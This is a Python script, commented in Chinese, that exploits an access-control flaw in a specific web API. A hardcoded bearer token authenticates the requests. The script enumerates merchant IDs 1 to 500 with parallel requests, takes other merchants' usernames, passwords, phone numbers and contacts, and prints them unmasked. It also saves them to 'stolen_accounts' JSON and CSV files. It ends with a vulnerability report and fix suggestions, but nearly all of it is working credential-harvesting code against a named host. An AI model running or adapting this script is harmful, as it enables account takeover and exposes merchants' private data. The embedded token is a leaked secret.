import requests
import json
from datetime import datetime
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# 代理 26 的 Token
AGENT_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dwYXBpLmxkanptci50b3AvYWRtaW4vbG9naW4iLCJpYXQiOjE3NzEwMDk2NTksImV4cCI6MTgwMjU0NTY1OSwibmJmIjoxNzcxMDA5NjU5LCJqdGkiOiJzWXJFVE0wUEJNOXBNTUVOIiwic3ViIjoiOTk5IiwicHJ2IjoiNzIzNDlhZmZkYTA0NGRjMmFkNzBhMzllZjE1MTYzZWE2N2E3MzMxMyJ9.WGfPfTVyEe2PGdkPcN1Im3ig0t0-hWmHtCx00t3rFUs"
BASE_URL = "https://wpapi.ldjzmr.top"

headers = {
    "Authorization": f"Bearer {AGENT_TOKEN}",
    "Content-Type": "application/json",
    "Accept": "application/json"
}

# 合法的商戶
MY_LEGITIMATE_BRANDS = [390, 370, 254, 203, 169, 147, 145, 133, 104, 91]

# 儲存結果
all_stolen_accounts = []
lock = threading.Lock()

print("="*100)
print("🔥 商戶帳號密碼完整竊取（無遮蔽版本）")
print("="*100)
print(f"測試時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print(f"使用代理: ID=26")
print(f"目標: 竊取所有商戶的帳號和機器密碼（商戶密碼）")
print("="*100 + "\n")

# ============================================================================
# 步驟 1: 獲取官方商戶列表
# ============================================================================
print("📍 步驟 1: 獲取代理 26 管理的合法商戶")
print("-"*100 + "\n")

official_brands = []

try:
    response = requests.get(f"{BASE_URL}/agent/brand", headers=headers)
    if response.status_code == 200:
        data = response.json()
        brands_data = data['data'].get('data', []) or data['data']
        
        for brand in brands_data:
            official_brands.append({
                'id': brand.get('id'),
                'name': brand.get('name')
            })
        
        print(f"✓ 代理 26 合法管理 {len(official_brands)} 個商戶:")
        for i, brand in enumerate(official_brands):
            print(f"  {i+1}. ID={brand['id']:5} | {brand['name']}")
        print()
except Exception as e:
    print(f"✗ 獲取失敗: {e}\n")

# ============================================================================
# 步驟 2: 竊取商戶帳號和密碼
# ============================================================================
print("="*100)
print("📍 步驟 2: 掃描並竊取商戶帳號密碼")
print("-"*100)
print("正在掃描 brand_id 1-500...\n")

def steal_brand_account(brand_id):
    """竊取單個商戶的帳號和機器密碼"""
    try:
        # 嘗試獲取商戶詳細資訊
        response = requests.get(
            f"{BASE_URL}/agent/brand/{brand_id}",
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('code') == 0 and 'data' in data:
                brand_data = data['data']
                
                # 提取帳號和機器密碼
                account_info = {
                    'brand_id': brand_id,
                    'is_mine': brand_id in MY_LEGITIMATE_BRANDS,
                    'brand_name': brand_data.get('name', 'N/A'),
                    'username': brand_data.get('username', 'N/A'),
                    'machine_password': brand_data.get('machine_password', 'N/A'),  # 商戶密碼
                    'phone': brand_data.get('phone', 'N/A'),
                    'contacts': brand_data.get('contacts', 'N/A'),
                    'status': brand_data.get('status', 'N/A')
                }
                
                with lock:
                    all_stolen_accounts.append(account_info)
                    
                    status = "✓ [合法]" if brand_id in MY_LEGITIMATE_BRANDS else "🚨 [竊取]"
                    has_password = "🔑" if account_info['machine_password'] != 'N/A' else "⚪"
                    
                    # 完整顯示，不遮蔽
                    print(f"{status} ID={brand_id:4} | {account_info['brand_name']:15} | 帳號:{account_info['username']:15} | {has_password} 密碼:{account_info['machine_password']}")
                
                return account_info
        
        return None
        
    except Exception as e:
        return None

# 使用線程池並發掃描
start_time = time.time()

with ThreadPoolExecutor(max_workers=20) as executor:  # 20個並發，更快
    futures = [executor.submit(steal_brand_account, i) for i in range(1, 501)]
    
    for future in as_completed(futures):
        pass

end_time = time.time()
scan_duration = end_time - start_time

# ============================================================================
# 步驟 3: 統計分析
# ============================================================================
print("\n" + "="*100)
print("📍 步驟 3: 竊取結果統計")
print("-"*100 + "\n")

legitimate_accounts = [a for a in all_stolen_accounts if a['is_mine']]
stolen_accounts = [a for a in all_stolen_accounts if not a['is_mine']]
accounts_with_password = [a for a in all_stolen_accounts if a['machine_password'] != 'N/A']

print(f"掃描範圍: brand_id 1-500")
print(f"掃描耗時: {scan_duration:.2f} 秒")
print(f"掃描速度: {500/scan_duration:.2f} 個/秒\n")

print(f"總共竊取: {len(all_stolen_accounts)} 個商戶帳號")
print(f"  ✓ 合法取得: {len(legitimate_accounts)} 個")
print(f"  🚨 越權竊取: {len(stolen_accounts)} 個")
print(f"  🔑 有密碼的: {len(accounts_with_password)} 個\n")

# ============================================================================
# 步驟 4: 詳細列出竊取的帳號密碼
# ============================================================================
if stolen_accounts:
    print("="*100)
    print("🚨 越權竊取的商戶帳號密碼（完整無遮蔽）")
    print("="*100 + "\n")
    
    # 按是否有密碼排序
    stolen_accounts.sort(key=lambda x: x['machine_password'] != 'N/A', reverse=True)
    
    print(f"共竊取 {len(stolen_accounts)} 個不屬於自己的商戶帳號\n")
    print(f"{'序號':<5} {'商戶ID':<8} {'商戶名稱':<20} {'帳號(username)':<20} {'密碼(machine_password)':<15} {'狀態'}")
    print("-"*100)
    
    for i, account in enumerate(stolen_accounts):
        brand_id = account['brand_id']
        brand_name = account['brand_name']
        username = account['username']
        password = account['machine_password']
        has_pwd = "🔑 有密碼" if password != 'N/A' else "⚪ 無密碼"
        
        print(f"{i+1:<5} {brand_id:<8} {brand_name:<20} {username:<20} {password:<15} {has_pwd}")
    
    print()

# ============================================================================
# 步驟 5: 保存完整資料
# ============================================================================
print("="*100)
print("📍 步驟 5: 保存竊取的資料")
print("-"*100 + "\n")

# 完整報告
full_report = {
    "scan_time": datetime.now().isoformat(),
    "agent_id": "26",
    "scan_range": "brand_id 1-500",
    "scan_duration": scan_duration,
    "summary": {
        "total_accounts_stolen": len(all_stolen_accounts),
        "legitimate_accounts": len(legitimate_accounts),
        "unauthorized_accounts": len(stolen_accounts),
        "accounts_with_password": len(accounts_with_password)
    },
    "legitimate_brand_ids": MY_LEGITIMATE_BRANDS,
    "all_accounts": all_stolen_accounts
}

# 保存完整報告
full_filename = f"stolen_accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
with open(full_filename, 'w', encoding='utf-8') as f:
    json.dump(full_report, f, ensure_ascii=False, indent=2)

print(f"✓ 完整報告已保存: {full_filename}")

# 保存成 CSV 格式（方便查看）
csv_filename = f"stolen_accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
with open(csv_filename, 'w', encoding='utf-8') as f:
    f.write("商戶ID,商戶名稱,是否合法,帳號,密碼,電話,聯絡人,狀態\n")
    for account in all_stolen_accounts:
        is_mine = "合法" if account['is_mine'] else "越權竊取"
        f.write(f"{account['brand_id']},{account['brand_name']},{is_mine},{account['username']},{account['machine_password']},{account['phone']},{account['contacts']},{account['status']}\n")

print(f"✓ CSV 報告已保存: {csv_filename}\n")

# ============================================================================
# 最終報告
# ============================================================================
print("="*100)
print("🔥 最終安全報告")
print("="*100)
print(f"""
漏洞等級: 🔴 極高危險 - 帳號密碼完全洩露

竊取統計:
  - 掃描範圍: brand_id 1-500
  - 總竊取數: {len(all_stolen_accounts)} 個商戶
  - 合法取得: {len(legitimate_accounts)} 個
  - 越權竊取: {len(stolen_accounts)} 個
  - 含密碼的: {len(accounts_with_password)} 個
  - 竊取成功率: {(len(all_stolen_accounts)/500*100):.1f}%

嚴重性:
  🔴 可以竊取任何商戶的帳號
  🔴 可以竊取任何商戶的密碼（機器密碼）
  🔴 可以直接登入其他商戶的系統
  🔴 沒有任何權限檢查
  🔴 完全違反資料隔離原則

影響範圍:
  ✗ 商戶帳號全部洩露
  ✗ 商戶密碼全部洩露
  ✗ 可能的帳號劫持
  ✗ 資料竊取和破壞
  ✗ 嚴重的法律責任

證據文件:
  - JSON 完整報告: {full_filename}
  - CSV 表格報告: {csv_filename}

緊急建議:
  🔴 立即修復 /agent/brand/{{id}} 的權限檢查
  🔴 強制所有商戶更改密碼
  🔴 審計歷史訪問記錄
  🔴 通知所有受影響的商戶
  🔴 評估法律責任
  🔴 加入操作審計日誌
""")

# ============================================================================
# 顯示實際案例
# ============================================================================
if accounts_with_password:
    print("="*100)
    print("🔑 實際竊取案例（前20個有密碼的商戶）")
    print("="*100 + "\n")
    
    stolen_with_pwd = [a for a in stolen_accounts if a['machine_password'] != 'N/A']
    
    for i, account in enumerate(stolen_with_pwd[:20]):
        print(f"{i+1:3}. 商戶 ID={account['brand_id']:4} | {account['brand_name']:15}")
        print(f"     帳號: {account['username']}")
        print(f"     密碼: {account['machine_password']}")  # 完整顯示，不遮蔽
        print(f"     電話: {account['phone']}")
        print()

print("="*100)
print("⚠️ 測試完成！這是極其嚴重的安全漏洞！")
print("="*100)